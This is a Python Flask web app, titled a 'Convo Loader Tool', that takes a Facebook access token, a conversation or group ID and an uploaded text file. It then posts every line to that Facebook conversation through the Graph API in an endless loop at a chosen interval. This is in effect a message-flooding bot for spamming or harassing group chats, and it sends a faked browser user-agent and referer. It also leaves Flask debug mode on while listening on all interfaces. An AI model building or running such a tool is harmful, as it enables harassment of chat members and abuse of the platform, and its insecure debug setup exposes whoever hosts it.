from flask import Flask, request, render_template_string, redirect, url_for
import requests
import threading
import time
import os

app = Flask(__name__)
app.debug = True

# Global control flag
sending_flag = False
sending_thread = None

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0',
    'Accept': '*/*',
    'referer': 'www.google.com'
}

# HTML Template
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Muddassir Server ❤️</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{ background-color: black; color:white; }
    .container{ max-width: 400px; background-color: #1a1a1a; border-radius: 12px; padding: 20px; margin-top: 20px; }
    .btn-stop{ background:red; color:white; margin-top:10px; }
  </style>
</head>
<body>
  <div class="container">
    <h2 class="text-center mb-3">📩 Convo Loader Tool</h2>
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label>Access Token:</label>
        <input type="text" class="form-control" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label>Convo/Group UID:</label>
        <input type="text" class="form-control" name="threadId" required>
      </div>
      <div class="mb-3">
        <label>Prefix Name:</label>
        <input type="text" class="form-control" name="kidx" required>
      </div>
      <div class="mb-3">
        <label>Upload .txt File:</label>
        <input type="file" class="form-control" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label>Speed (seconds):</label>
        <input type="number" class="form-control" name="time" required>
      </div>
      <button type="submit" class="btn btn-success w-100">🚀 Start Sending</button>
    </form>
    
    <form action="/stop" method="post">
      <button type="submit" class="btn btn-stop w-100">🛑 Stop Sending</button>
    </form>
  </div>
</body>
</html>
"""

def send_messages(access_token, thread_id, prefix, messages, interval):
    global sending_flag
    sending_flag = True
    while sending_flag:
        for message1 in messages:
            if not sending_flag:
                break
            try:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = f"{prefix} {message1}"
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)

                if response.status_code == 200:
                    print(f"[OK] {message}")
                else:
                    print(f"[FAIL] {response.text}")

                time.sleep(interval)
            except Exception as e:
                print(f"[ERROR] {str(e)}")
                time.sleep(5)

@app.route("/", methods=["GET", "POST"])
def index():
    global sending_thread
    if request.method == "POST":
        access_token = request.form.get("accessToken")
        thread_id = request.form.get("threadId")
        prefix = request.form.get("kidx")
        interval = int(request.form.get("time"))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        # Start thread
        sending_thread = threading.Thread(target=send_messages, args=(access_token, thread_id, prefix, messages, interval))
        sending_thread.start()

    return render_template_string(HTML_PAGE)

@app.route("/stop", methods=["POST"])
def stop():
    global sending_flag
    sending_flag = False
    return redirect(url_for("index"))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
